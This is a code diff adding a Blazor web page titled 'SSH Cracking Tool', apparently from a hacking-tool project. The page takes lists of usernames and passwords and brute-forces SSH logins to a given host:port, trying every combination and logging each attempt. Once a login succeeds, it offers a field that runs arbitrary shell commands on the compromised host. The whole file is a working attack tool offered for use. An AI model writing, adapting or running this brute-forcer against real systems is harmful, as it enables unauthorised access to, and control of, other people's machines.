@@ -1,0 +1,107 @@
+﻿@page "/ssh"
+@using HackLibrary;
+@using SshNet;
+<link rel="stylesheet" href="css/buttons.css" />
+<style>
+    .th, td {
+        width: 50%;
+        margin: 5px;
+    }
+</style>
+
+<h1>SSH Cracking Tool</h1>
+
+<h3>Enter Usernames and Passwords to bruteforce a host IP</h3>
+<table>
+    <thead>
+        <tr>
+            <th>Usernames (comma seperated)</th>
+            <th>Passwords (comma seperated)</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td><textarea @bind="users"></textarea></td>
+            <td><textarea @bind="passwords"></textarea></td>
+        </tr>
+        <tr>
+            <th>Host IP (address:port)</th>
+            <th></th>
+        </tr>
+        <tr>
+            <td><input @bind="host"></td>
+            <td></td>
+        </tr>
+    </tbody>
+</table>
+<br />
+<button class="button-5" @onclick="AttemptConnection">Connect</button>
+<hr />
+@if (log != "") 
+{ 
+    <h2>Log</h2>
+    <textarea style="width: 75%; min-height: 200px" @bind="log" readonly></textarea><hr />
+    <label>Command: <input @bind="command" @onkeydown="Enter" @bind:event="oninput" /></label>
+}
+
+@code {
+    private string passwords;
+    private string users;
+
+    private string host;
+    private string command;
+
+    private string log = "";
+
+    private bool readOnly = true;
+
+    int logLen = 0;
+    Renci.SshNet.SshClient found_client;
+
+    private void AttemptConnection()
+    {
+        HackLibrary.SSHCrack.SetUsersFromString(users);
+        HackLibrary.SSHCrack.SetPasswordsFromString(passwords);
+        HackLibrary.SSHCrack.Host = host;
+        foreach (string user in HackLibrary.SSHCrack.users)
+        {
+            log += $"Connecting to {user}@{host}:\n";
+            foreach (string pass in HackLibrary.SSHCrack.passwords)
+            {
+                log += $"Trying {user}:{pass}\n";
+                Renci.SshNet.SshClient client = new Renci.SshNet.SshClient(host, user, pass);
+                if (client != null)
+                {
+                    try
+                    {
+                        client.Connect();
+
+                        if (client.IsConnected)
+                        {
+                            found_client = client;
+                            log += $"Success!\n{found_client.ConnectionInfo.Username} >> ";
+                            readOnly = false;
+                            logLen = log.Length;
+                            return;
+
+                        }
+                    }
+                    catch
+                    {
+                        log += $"Failed.\n";
+                    }
+                }
+            }
+        }
+    }
+    public void Enter(KeyboardEventArgs e)
+    {
+        if (e.Code == "Enter" || e.Code == "NumpadEnter" && found_client.IsConnected && command.Length > 0)
+        {
+            int addAfter = log.Substring(logLen).Length;
+            log += $"{command}\n" + found_client.RunCommand(command).Result + $"{found_client.ConnectionInfo.Username} >> ";
+            command = "";
+            logLen = log.Length;
+        }
+    }
+}
